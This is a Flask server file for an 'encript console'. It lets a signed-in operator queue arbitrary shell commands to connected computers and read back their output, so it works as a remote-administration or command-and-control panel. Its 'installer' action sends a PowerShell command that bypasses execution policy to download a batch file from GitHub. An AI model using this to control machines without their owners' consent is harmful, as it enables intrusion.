import hmac
import io
import os
import queue
import threading
import time
import uuid

from datetime import timedelta
from functools import wraps

from flask import (
    Flask, jsonify, redirect, render_template_string,
    request, send_file, session, url_for
)

app = Flask(__name__)

USERNAME = os.environ["DASH_USER"]
PASSWORD = os.environ["DASH_PASSWORD"]

app.secret_key = (
    os.environ.get("DASH_SECRET")
    or hmac.new(
        PASSWORD.encode(),
        b"encript-console-session",
        "sha256"
    ).hexdigest()
)

app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=30)
app.config["MAX_CONTENT_LENGTH"] = 2 * 1024 * 1024

OFFLINE_AFTER_SECONDS = 60
NAME_REUSE_SECONDS = 90
COMMAND_TTL_SECONDS = 1800
OUTPUT_LIMIT = 100000

clients = {}
client_actions = {}
console_commands = {}
next_uid = 1

lock = threading.Lock()


# ==================================================
# AUTHENTICATION
# ==================================================

def valid_credentials(auth):

    if not auth:
        return False

    valid_user = hmac.compare_digest(
        auth.username or "", USERNAME
    )

    valid_password = hmac.compare_digest(
        auth.password or "", PASSWORD
    )

    return valid_user and valid_password


def is_signed_in():

    return session.get("user") == USERNAME


def is_machine_request():

    return request.path in (
        "/sync",
        "/next-action",
        "/upload-console"
    )


def require_auth(function):

    @wraps(function)
    def wrapper(*args, **kwargs):

        if is_machine_request():

            if valid_credentials(request.authorization) or is_signed_in():
                return function(*args, **kwargs)

            return jsonify({"error": "Authentication required"}), 401

        if is_signed_in():
            return function(*args, **kwargs)

        if request.path.startswith("/api/"):
            return jsonify({"error": "Authentication required"}), 401

        return redirect(url_for("login"))

    return wrapper


# ==================================================
# CLIENT HELPERS
# ==================================================

def allocate_name(computer_name, now):

    base_name = (computer_name or "").strip()[:120] or "Computer"

    entry = clients.get(base_name)

    if not entry or now - entry["last_seen"] > NAME_REUSE_SECONDS:
        return base_name

    index = 1

    while True:

        candidate = f"{base_name} ({index})"
        entry = clients.get(candidate)

        if not entry or now - entry["last_seen"] > NAME_REUSE_SECONDS:
            return candidate

        index += 1


def remove_client(name):

    clients.pop(name, None)
    client_actions.pop(name, None)


def prune_stale(now):

    for name in list(clients):

        if now - clients[name]["last_seen"] > OFFLINE_AFTER_SECONDS:
            remove_client(name)


def prune_commands(now):

    for command_id in list(console_commands):

        if now - console_commands[command_id]["created"] > COMMAND_TTL_SECONDS:
            console_commands.pop(command_id, None)


# ==================================================
# PAGES
# ==================================================

@app.route("/login", methods=["GET", "POST"])
def login():

    if is_signed_in():
        return redirect("/")

    error = ""

    if request.method == "POST":

        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""

        if (
            hmac.compare_digest(username, USERNAME)
            and hmac.compare_digest(password, PASSWORD)
        ):

            session.clear()
            session.permanent = True
            session["user"] = USERNAME

            return redirect("/")

        error = "Incorrect username or password."

    return render_template_string(LOGIN_PAGE, error=error)


@app.route("/logout")
def logout():

    session.clear()

    return redirect(url_for("login"))


ICON_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "website.ico"
)


@app.route("/favicon.ico")
def favicon():

    try:
        with open(ICON_PATH, "rb") as icon:
            return send_file(
                io.BytesIO(icon.read()),
                mimetype="image/vnd.microsoft.icon",
                max_age=0
            )
    except FileNotFoundError:
        return "", 404


@app.route("/")
@require_auth
def console_page():

    return render_template_string(CONSOLE_PAGE)


# ==================================================
# CLIENT PROTOCOL
# ==================================================

@app.route("/sync", methods=["POST"])
@require_auth
def sync():

    global next_uid

    data = request.get_json(silent=True) or {}

    requested_name = data.get("name")
    computer_name = data.get("computer_name") or requested_name
    root = data.get("root") or ""
    tree = data.get("tree")

    if not computer_name or not isinstance(tree, dict):
        return jsonify({"error": "Invalid client data"}), 400

    with lock:

        now = time.time()

        prune_stale(now)

        if requested_name and requested_name in clients:

            assigned_name = requested_name
            uid = clients[assigned_name]["uid"]

        else:

            assigned_name = allocate_name(computer_name, now)
            existing = clients.get(assigned_name)

            if existing:

                uid = existing["uid"]

            else:

                uid = next_uid
                next_uid += 1

        clients[assigned_name] = {
            "name": assigned_name,
            "uid": uid,
            "computer_name": computer_name,
            "root": root,
            "last_seen": now
        }

        client_actions.setdefault(assigned_name, queue.Queue())

    return jsonify({
        "success": True,
        "name": assigned_name,
        "uid": uid
    })


@app.route("/next-action")
@require_auth
def next_action():

    name = request.args.get("name") or ""

    with lock:

        client = clients.get(name)

        if client:
            client["last_seen"] = time.time()

        action_queue = client_actions.get(name)

    if not action_queue:
        return jsonify({"action": None})

    try:
        action = action_queue.get_nowait()
    except queue.Empty:
        action = None

    return jsonify(action or {"action": None})


@app.route("/upload-console", methods=["POST"])
@require_auth
def upload_console():

    command_id = request.form.get("command_id")
    name = request.form.get("name")
    output_text = request.form.get("output", "")
    exit_code = request.form.get("exit_code", "0")

    if not command_id or not name:
        return jsonify({"error": "Missing information"}), 400

    try:
        exit_code = int(exit_code)
    except ValueError:
        exit_code = 0

    with lock:

        item = console_commands.get(command_id)

        if not item or item["name"] != name:
            return jsonify({"error": "Invalid console request"}), 403

        item["output"] = output_text[:OUTPUT_LIMIT]
        item["exit_code"] = exit_code
        item["status"] = "ready"

    return jsonify({"success": True})


# ==================================================
# CONSOLE API
# ==================================================

INSTALLER_URL = (
    "https://raw.githubusercontent.com/"
    "downloader-AXP/downloaders/main/installer.bat"
)


def installer_command():

    return (
        'powershell -NoProfile -ExecutionPolicy Bypass -Command "'
        "[Net.ServicePointManager]::SecurityProtocol = "
        "[Net.ServicePointManager]::SecurityProtocol -bor "
        "[Net.SecurityProtocolType]::Tls12; "
        "$ErrorActionPreference = 'Stop'; "
        "$d = Join-Path $env:LOCALAPPDATA 'RemoteAdmin'; "
        "New-Item -ItemType Directory -Force -Path $d | Out-Null; "
        f"Invoke-WebRequest -UseBasicParsing -Uri ('{INSTALLER_URL}?t=' + [guid]::NewGuid().ToString('N')) "
        "-OutFile (Join-Path $d 'installer.bat'); "
        "Get-Item (Join-Path $d 'installer.bat') | Select-Object -ExpandProperty FullName"
        '"'
    )


def queue_console(name, command):

    now = time.time()

    prune_stale(now)
    prune_commands(now)

    if name not in clients:
        return None

    command_id = str(uuid.uuid4())

    console_commands[command_id] = {
        "name": name,
        "status": "pending",
        "output": "",
        "exit_code": 0,
        "created": now
    }

    client_actions.setdefault(name, queue.Queue()).put({
        "action": "console",
        "command_id": command_id,
        "command": command
    })

    return command_id


@app.route("/api/clients")
@require_auth
def api_clients():

    with lock:

        now = time.time()

        prune_stale(now)

        result = [
            {
                "uid": client["uid"],
                "name": client["name"],
                "last_seen": client["last_seen"]
            }
            for client in clients.values()
        ]

    result.sort(key=lambda client: client["uid"])

    return jsonify({"clients": result})


@app.route("/api/console/command", methods=["POST"])
@require_auth
def console_command():

    data = request.get_json(silent=True) or {}

    name = data.get("name") or ""
    command = data.get("command") or ""

    if not isinstance(command, str) or not command.strip():
        return jsonify({"error": "Invalid command."}), 400

    command = command.strip()

    if len(command) > 4000:
        return jsonify({"error": "Command is too long."}), 400

    with lock:
        command_id = queue_console(name, command)

    if not command_id:
        return jsonify({"error": "Computer not found."}), 404

    return jsonify({"command_id": command_id})


@app.route("/api/console/installer", methods=["POST"])
@require_auth
def console_installer():

    data = request.get_json(silent=True) or {}
    name = data.get("name") or ""

    with lock:
        command_id = queue_console(name, installer_command())

    if not command_id:
        return jsonify({"error": "Computer not found."}), 404

    return jsonify({"command_id": command_id})


@app.route("/api/console/result/<command_id>")
@require_auth
def console_result(command_id):

    with lock:
        item = console_commands.get(command_id)

    if not item:
        return jsonify({"error": "Request not found"}), 404

    return jsonify({
        "status": item["status"],
        "output": item.get("output", ""),
        "exit_code": item.get("exit_code", 0)
    })


# ==================================================
# PAGES CONTENT
# ==================================================

LOGIN_PAGE = r"""
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>encript</title>
<link rel="icon" type="image/x-icon" href="/favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        background: #050608;
        color: #c8facc;
        font-family: Consolas, "Courier New", monospace;
        font-size: 14px;
    }
    form {
        width: 280px;
        display: grid;
        gap: 10px;
    }
    h1 {
        margin: 0 0 6px;
        font-size: 16px;
        font-weight: normal;
        color: #8ee89a;
    }
    input, button {
        padding: 8px 10px;
        font: inherit;
        color: #c8facc;
        background: #0b100c;
        border: 1px solid #1d2a1f;
    }
    button {
        background: #16241a;
        border-color: #2a4a30;
        cursor: pointer;
    }
    .error {
        margin: 0;
        font-size: 13px;
        color: #ff7676;
    }
</style>
</head>
<body>

<form method="post" action="/login">
    <h1>encript console</h1>
    {% if error %}<p class="error">{{ error }}</p>{% endif %}
    <input name="username" type="text" placeholder="username" autocomplete="username" autofocus>
    <input name="password" type="password" placeholder="password" autocomplete="current-password">
    <button type="submit">sign in</button>
</form>

</body>
</html>
"""


CONSOLE_PAGE = r"""
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>encript</title>
<link rel="icon" type="image/x-icon" href="/favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    * {
        box-sizing: border-box;
    }
    html, body {
        height: 100%;
    }
    body {
        margin: 0;
        display: flex;
        flex-direction: column;
        background: #050608;
        color: #c8facc;
        font-family: Consolas, "Courier New", monospace;
        font-size: 14px;
    }
    header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 8px 12px;
        border-bottom: 1px solid #1d2a1f;
        color: #6f9c76;
        font-size: 12px;
    }
    header a {
        color: #6f9c76;
    }
    #output {
        flex: 1;
        overflow-y: auto;
        padding: 12px;
    }
    .line {
        white-space: pre-wrap;
        word-break: break-word;
    }
    .muted {
        color: #5d7a62;
    }
    .echo {
        color: #7fb2ff;
    }
    .err {
        color: #ff7676;
    }
    #status {
        padding: 4px 12px;
        border-top: 1px solid #1d2a1f;
        color: #6f9c76;
        font-size: 12px;
    }
    #form {
        display: flex;
        gap: 8px;
        padding: 8px 12px 12px;
    }
    #prompt {
        white-space: nowrap;
        color: #8ee89a;
    }
    #input {
        flex: 1;
        background: transparent;
        border: none;
        outline: none;
        color: #c8facc;
        font: inherit;
        caret-color: #8ee89a;
    }
    #input:disabled {
        opacity: 0.5;
    }
</style>
</head>
<body>

<header>
    <span>encript</span>
    <a href="/logout">sign out</a>
</header>

<div id="output"></div>

<div id="status">not synced</div>

<form id="form" autocomplete="off">
    <span id="prompt">&gt;</span>
    <input id="input" type="text" spellcheck="false" autofocus>
</form>

<script>
const outputBox = document.getElementById("output");
const form = document.getElementById("form");
const input = document.getElementById("input");
const prompt = document.getElementById("prompt");
const status = document.getElementById("status");

const POLL_MS = 500;
const LINE_LIMIT = 500;
const RESULT_TIMEOUT_MS = 300000;

let target = "";
let targets = {};
let history = [];
let historyIndex = 0;
let busy = false;


function print(text, style) {

    const line = document.createElement("div");

    line.className = "line" + (style ? " " + style : "");
    line.textContent = text;

    outputBox.appendChild(line);

    while (outputBox.childElementCount > LINE_LIMIT) {
        outputBox.firstElementChild.remove();
    }

    outputBox.scrollTop = outputBox.scrollHeight;
}


function setBusy(value) {

    busy = value;
    input.disabled = value;
}


function setTarget(name) {

    target = name;

    prompt.textContent = name ? name + ">" : ">";

    status.textContent = name
        ? "target: " + name
        : "not synced";
}


function focusInput() {

    if (!input.disabled) {
        input.focus();
    }
}


async function api(path, options) {

    const response = await fetch(path, options);

    if (response.status === 401) {
        window.location.href = "/login";
        throw new Error("Signed out.");
    }

    const data = await response.json();

    if (!response.ok) {
        throw new Error(data.error || "Request failed.");
    }

    return data;
}


async function loadComputers() {

    const data = await api("/api/clients");

    targets = {};

    for (const computer of data.clients || []) {
        targets[String(computer.uid)] = computer.name;
    }

    return data.clients || [];
}


async function showList() {

    const computers = await loadComputers();

    if (!computers.length) {
        print("No computers are connected.", "muted");
        return;
    }

    print("UID  COMPUTER", "muted");

    for (const computer of computers) {

        print(
            String(computer.uid).padEnd(5) + computer.name
        );
    }
}


async function syncTo(argument) {

    const wanted = argument.trim();

    if (!wanted) {
        return;
    }

    const computers = await loadComputers();

    let name = targets[wanted] || "";

    if (!name) {

        const lower = wanted.toLowerCase();

        const match = computers.find(
            computer => computer.name.toLowerCase() === lower
        );

        name = match ? match.name : "";
    }

    if (!name) {
        print("No computer matches " + wanted + ".", "err");
        return;
    }

    setTarget(name);

    print("Synced to " + name + ".", "muted");
}


async function waitResult(commandId) {

    const deadline = Date.now() + RESULT_TIMEOUT_MS;

    while (Date.now() < deadline) {

        await new Promise(
            resolve => setTimeout(resolve, POLL_MS)
        );

        const data = await api(
            "/api/console/result/" + encodeURIComponent(commandId)
        );

        if (data.status === "ready") {
            return data;
        }

        if (data.status === "error") {
            throw new Error(data.message || "Command failed.");
        }
    }

    throw new Error("Timed out waiting for the computer.");
}


async function runCommand() {

    if (busy) {
        return;
    }

    const raw = input.value;
    const command = raw.trim();

    if (!command) {
        return;
    }

    input.value = "";

    history.push(raw);
    historyIndex = history.length;

    if (/^(clear|cls)$/i.test(command)) {

        outputBox.textContent = "";
        return;
    }

    print((target || "remote") + "> " + raw, "echo");

    if (/^list$/i.test(command)) {

        setBusy(true);

        try {

            await showList();

        } catch (error) {

            print("ERROR: " + error.message, "err");

        } finally {

            setBusy(false);
            focusInput();
        }

        return;
    }

    if (/^sync(?:\s|$)/i.test(command)) {

        setBusy(true);

        try {

            await syncTo(command.replace(/^sync\s*/i, ""));

        } catch (error) {

            print("ERROR: " + error.message, "err");

        } finally {

            setBusy(false);
            focusInput();
        }

        return;
    }

    if (/^installer$/i.test(command)) {

        setBusy(true);

        try {

            if (!target) {
                throw new Error("No computer targeted.");
            }

            const data = await api("/api/console/installer", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    name: target
                })
            });

            const result = await waitResult(data.command_id);

            if (result.output) {
                print(result.output.replace(/\s+$/, ""));
            }

            if (result.exit_code) {
                print("[exit code " + result.exit_code + "]", "muted");
            }

        } catch (error) {

            print("ERROR: " + error.message, "err");

        } finally {

            setBusy(false);
            focusInput();
        }

        return;
    }

    if (!target) {

        print("No computer targeted.", "err");

        return;
    }

    setBusy(true);

    try {

        const data = await api("/api/console/command", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: target,
                command: command
            })
        });

        const result = await waitResult(data.command_id);

        if (result.output) {
            print(result.output.replace(/\s+$/, ""));
        }

        if (result.exit_code) {
            print("[exit code " + result.exit_code + "]", "muted");
        }

    } catch (error) {

        print("ERROR: " + error.message, "err");

    } finally {

        setBusy(false);
        focusInput();
    }
}


form.addEventListener("submit", function(event) {

    event.preventDefault();
    runCommand();
});


input.addEventListener("keydown", function(event) {

    if (event.key === "Enter") {

        event.preventDefault();
        runCommand();

        return;
    }

    if (event.key === "ArrowUp") {

        if (!history.length) {
            return;
        }

        event.preventDefault();

        historyIndex = Math.max(0, historyIndex - 1);
        input.value = history[historyIndex] || "";

    } else if (event.key === "ArrowDown") {

        if (!history.length) {
            return;
        }

        event.preventDefault();

        historyIndex = Math.min(history.length, historyIndex + 1);
        input.value = history[historyIndex] || "";
    }
});


outputBox.addEventListener("click", focusInput);

input.focus();
</script>

</body>
</html>
"""


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", "5000"))
    )
